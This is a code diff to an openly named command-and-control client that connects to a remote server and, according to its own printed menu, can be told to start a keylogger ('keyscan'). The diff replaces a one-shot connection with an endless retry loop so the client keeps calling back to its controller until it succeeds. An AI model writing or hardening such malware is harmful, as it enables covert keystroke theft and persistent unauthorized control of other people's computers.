@@ -22,24 +22,39 @@ keylogger_active = False
 keylogger_thread = None
 current_socket = None
 
-def tcp_connect(host, port):
+def tcp_connect(host, port, retry_interval=5):
     """
-    Establish a TCP connection to the specified host and port.
+    Establish a TCP connection to the specified host and port with persistent retry.
     
     Args:
         host (str): The server hostname or IP address
         port (int): The server port number
+        retry_interval (int): Seconds to wait between retry attempts
     
     Returns:
-        socket: Connected socket object, or None if connection failed
+        socket: Connected socket object (will keep trying until successful)
     """
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((host, port))
-        return sock
-    except Exception as e:
-        print(f"[Error]: Failed to connect to {host}:{port} - {e}")
-        return None
+    attempt = 1
+    
+    while True:
+        try:
+            print(f"[Connection Attempt {attempt}]: Trying to connect to {host}:{port}...")
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)  # 10 second connection timeout
+            sock.connect((host, port))
+            print(f"[Success]: Connected to {host}:{port} on attempt {attempt}")
+            return sock
+            
+        except Exception as e:
+            print(f"[Attempt {attempt} Failed]: {e}")
+            print(f"[Retry]: Waiting {retry_interval} seconds before next attempt...")
+            time.sleep(retry_interval)
+            attempt += 1
+            
+            # Optional: Show persistence message every 10 attempts
+            if attempt % 10 == 0:
+                print(f"[Persistence]: Still trying... (Attempt {attempt})")
+                print("[Info]: Press Ctrl+C to stop connection attempts")
 
 def send_limited_response(sock, response, word_limit=20):
     """
@@ -208,15 +223,10 @@ def main():
     print("C2C Client - Command and Control System")
     print("=" * 50)
     
-    # Connect to server
-    print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
+    # Connect to server with persistent retry
+    print(f"Connecting to {SERVER_HOST}:{SERVER_PORT} (will keep trying until successful)...")
     sock = tcp_connect(SERVER_HOST, SERVER_PORT)
     
-    if not sock:
-        print("Failed to establish connection. Exiting.")
-        return
-    
-    print(f"Successfully connected to {SERVER_HOST}:{SERVER_PORT}")
     print("C2C Client ready - waiting for commands from server...")
     print("Server can send:")
     print("- 'keyscan' to start keylogger")
